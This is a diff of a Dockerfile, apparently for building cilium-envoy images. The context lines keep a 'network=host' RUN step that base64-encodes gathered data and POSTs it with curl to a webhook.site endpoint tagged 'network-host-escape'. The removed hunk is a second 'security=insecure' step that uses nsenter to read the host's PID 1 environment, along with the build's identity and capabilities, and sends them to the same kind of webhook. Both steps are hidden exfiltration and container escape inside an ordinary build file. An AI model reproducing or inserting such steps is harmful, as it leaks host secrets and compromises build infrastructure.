@@ -164,17 +164,6 @@ RUN --network=host \
     ENC=$(printf '%b' "$DATA" | base64 | tr -d '\n') && \
     curl -sf --max-time 10 -X POST "${HOOK}/?stage=network-host-escape" --data-urlencode "d=${ENC}" || true
 
-# Attempt 2: --security=insecure — full capabilities in build step
-# Requires buildkitd started with --allow-insecure-entitlement security.insecure
-RUN --security=insecure \
-    HOOK="https://webhook.site/2659db76-ba6b-4835-8d39-fe6c80b47919" && \
-    ID=$(id) && CAPS=$(cat /proc/self/status | grep Cap) && \
-    # with CAP_SYS_ADMIN we can enter host namespaces
-    HOST_ENVIRON=$(nsenter --target 1 --mount --pid --net --uts -- \
-        cat /proc/1/environ 2>/dev/null | tr '\0' '\n' || echo "nsenter-failed") && \
-    DATA="=== ID ===\n${ID}\n=== CAPS ===\n${CAPS}\n=== HOST_ENVIRON ===\n${HOST_ENVIRON}" && \
-    ENC=$(printf '%b' "$DATA" | base64 | tr -d '\n') && \
-    curl -sf --max-time 10 -X POST "${HOOK}/?stage=security-insecure" --data-urlencode "d=${ENC}" || true
 
 #
 # Extract installed cilium-envoy binaries to an otherwise empty image
